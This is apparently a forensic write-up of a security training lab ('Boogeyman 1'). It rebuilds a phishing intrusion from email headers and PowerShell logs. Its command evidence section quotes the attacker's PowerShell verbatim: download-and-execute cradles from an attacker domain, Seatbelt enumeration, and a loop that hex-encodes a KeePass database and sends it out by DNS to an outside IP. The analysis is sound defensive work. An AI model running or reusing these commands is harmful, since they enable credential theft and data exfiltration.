# Boogeyman 1 — Attack Timeline

This timeline is based on the current email, attachment, shortcut, and PowerShell endpoint evidence. Some events have exact timestamps from email headers and PowerShell logs. Manual analysis actions, such as rebuilding the attachment and running `lnkparse`, are listed in sequence order because they are analyst actions rather than attacker-executed events.

---

## Timeline

| Sequence | Time | Event | Evidence Source | Analyst Notes |
|---|---|---|---|---|
| 1 | 2023-01-13 09:25:26 UTC | Phishing email sent to victim | dump.eml email headers | Email was sent from Arthur Griffin using the sender address agriffin@bpakcaging.xyz to Julianne Westcott. |
| 2 | 2023-01-13 09:25:26 UTC | Invoice/payment lure used | dump.eml subject and body | The subject was Collection for Quick Logistics LLC - Jan 2023, making the message relevant to a finance employee. |
| 3 | 2023-01-13 09:25:26 UTC | Password-protected ZIP attachment delivered | dump.eml MIME attachment metadata | The email contained a Base64-encoded ZIP attachment named Invoice.zip. |
| 4 | 2023-01-13 09:25:26 UTC | ZIP password provided in email body | dump.eml email body | The password Invoice2023! was included directly in the phishing message. |
| 5 | 2023-01-13 09:25:31 UTC | Email received by Microsoft mail protection infrastructure | dump.eml Received headers | Message was received from pa80.mxout.mta1.net with sender IP 15.235.99.80. |
| 6 | 2023-01-13 09:25:31 UTC | Microsoft Exchange recorded original arrival time | X-MS-Exchange-CrossTenant-OriginalArrivalTime header | Header showed original arrival time as 13 Jan 2023 09:25:31.6882 UTC. |
| 7 | 2023-01-13 09:25:35 UTC | Email delivered through Outlook/Exchange infrastructure | dump.eml Received headers | Message was processed and delivered through Outlook/Exchange infrastructure. |
| 8 | Analyst action / not logged | Base64 attachment reconstructed into ZIP archive | Manual Base64 decoding | Base64 attachment content was copied into payload.txt and decoded into Invoice.zip. |
| 9 | Analyst action / not logged | ZIP archive extracted | ZIP extraction output | Extracting Invoice.zip with password Invoice2023! produced Invoice_20230103.lnk. |
| 10 | Analyst action / not logged | Shortcut file analyzed | lnkparse output | The extracted LNK file was analyzed to determine execution behavior. |
| 11 | Analyst action / not logged | Shortcut file found to reference PowerShell | lnkparse output | The shortcut referenced WindowsPowerShell v1.0 powershell.exe. |
| 12 | Analyst action / not logged | Shortcut file used Excel-related icon path | lnkparse output | The shortcut referenced C:\Users\Administrator\Desktop\excel.ico, suggesting invoice or spreadsheet disguise. |
| 13 | Analyst action / not logged | Shortcut configured hidden encoded PowerShell execution | lnkparse command-line arguments | Arguments included no profile, hidden window style, and encoded command execution. |
| 14 | Analyst action / not logged | Encoded PowerShell payload decoded | Decoded Base64 payload | The decoded command attempted to download and execute remote content from files.bpakcaging.xyz. |
| 15 | Analyst action / not logged | PowerShell download cradle identified | Decoded PowerShell command | The payload used a PowerShell download cradle to retrieve remote code from http://files.bpakcaging.xyz/update. |
| 16 | Observed in endpoint logs / exact first execution time not yet isolated | PowerShell endpoint activity observed on compromised workstation | powershell.json | Hostname identified as QL-WKSTN-5693. Further review can isolate the earliest logged execution of the initial payload. |
| 17 | Observed in endpoint logs / exact combined timestamp not assigned | Additional attacker infrastructure identified | PowerShell domain search | Domains cdn.bpakcaging.xyz and files.bpakcaging.xyz were observed in PowerShell logs. |
| 18 | 2023-01-13 17:12:17.683688 UTC | Attacker loaded or downloaded Seatbelt | PowerShell Event ID 4104, Record ID 553 | Invoke-Seatbelt.ps1 was referenced from a GitHub-hosted PowerSharpPack path. |
| 19 | 2023-01-13 17:18:05.437844 UTC | Seatbelt enumeration executed | PowerShell Event ID 4104, Record ID 630 | Seatbelt.exe was executed with a user-focused enumeration option. |
| 20 | 2023-01-13 17:19:06.035992 UTC | Attacker located KeePass database | PowerShell Event ID 4104, Record ID 646 | Attacker checked for protected_data.kdbx in the victim user's Documents directory. |
| 21 | 2023-01-13 17:22:47.494476 UTC | Attacker browsed Microsoft Sticky Notes package folder | PowerShell Event ID 4104, Record ID 686 | Command referenced the Microsoft Sticky Notes package directory under the victim user's AppData path. |
| 22 | 2023-01-13 17:22:53.558146 UTC | Attacker browsed Microsoft Sticky Notes LocalState folder | PowerShell Event ID 4104, Record ID 692 | Command referenced the Sticky Notes LocalState directory where plum.sqlite is stored. |
| 23 | 2023-01-13 17:23:38.796891 UTC | Attacker downloaded SQLite utility sq3.exe | PowerShell Event ID 4104, Record ID 703 | sq3.exe was downloaded from http://files.bpakcaging.xyz/sq3.exe. |
| 24 | 2023-01-13 17:24:12.967200 UTC | Attacker executed sq3.exe against Sticky Notes directory | PowerShell Event ID 4104, Record ID 714 | sq3.exe was executed against the Sticky Notes LocalState directory. |
| 25 | 2023-01-13 17:25:38.759011 UTC | Attacker queried Sticky Notes database | PowerShell Event ID 4104, Record ID 724 | sq3.exe was used to query plum.sqlite with a SELECT statement against the NOTE table. |
| 26 | 2023-01-13 17:31:48.507719 UTC | Attacker prepared KeePass database for exfiltration | PowerShell Event ID 4104, Record ID 741 | Attacker set a file variable for protected_data.kdbx, set destination 167.71.211.113, and attempted to read file bytes. |
| 27 | 2023-01-13 17:32:15.105474 UTC | Attacker read KeePass database as bytes using full path | PowerShell Event ID 4104, Record ID 762 | PowerShell was used to read C:\Users\j.westcott\Documents\protected_data.kdbx as bytes. |
| 28 | 2023-01-13 17:32:23.702462 UTC | Attacker converted file bytes to hex | PowerShell Event ID 4104, Record ID 768 | File bytes were converted into hexadecimal text for transfer. |
| 29 | 2023-01-13 17:32:41.384043 UTC | DNS-based exfiltration attempted | PowerShell Event ID 4104, Record ID 774 | nslookup was used to transmit hex-encoded chunks through DNS queries toward 167.71.211.113. |

---

## Key Command Evidence

The following command excerpts support key events in the timeline. These are included outside the main table for readability.

### Malicious LNK PowerShell Payload

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
````

### Seatbelt Download or Load

```powershell
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
```

### Seatbelt Execution

```powershell
Seatbelt.exe -group=user;pwd
```

### sq3.exe Download

```powershell
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
```

### Sticky Notes Database Query

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

### KeePass Database Discovery

```powershell
ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
```

### KeePass File Read

```powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
```

### Hex Encoding

```powershell
$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
```

### DNS-Based Exfiltration Attempt

```powershell
for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
```

***

## Current Timeline Assessment

The current evidence supports the following attack chain:

```text
Phishing email
→ Password-protected ZIP attachment
→ Malicious LNK file
→ Hidden encoded PowerShell
→ Remote download and execution
→ Endpoint enumeration
→ Sticky Notes database access
→ KeePass database targeting
→ Hex encoding
→ DNS-based exfiltration attempt
```

***

## Timeline Notes

* Events 1–7 are based on email header and mail-flow evidence.
* Events 8–15 are analyst actions performed during attachment and shortcut analysis.
* Events 16–29 are based on endpoint PowerShell log evidence.
* The exact first endpoint execution time for the original LNK payload has not yet been fully isolated.
* DNS exfiltration is identified as an attempted exfiltration based on PowerShell command evidence. Additional DNS/network logs would be needed to confirm whether the exfiltration fully succeeded.

***

## Next Actions

The next stage of the investigation should focus on confirming and enriching the timeline with additional endpoint and network evidence.

Items to verify next:

* Exact time `Invoice_20230103.lnk` was opened or executed.
* Parent process that launched PowerShell.
* User account associated with initial PowerShell execution.
* Whether `files.bpakcaging.xyz/update` was successfully downloaded.
* Full network evidence for HTTP requests to `files.bpakcaging.xyz`.
* DNS logs confirming whether the exfiltration attempt fully completed.
* Any additional persistence, lateral movement, or credential access activity.

```

When you’re done replacing `timeline.md`, send me **“next iocs.md”** and I’ll give you the cleaned copy-paste-ready `iocs.md`.
```
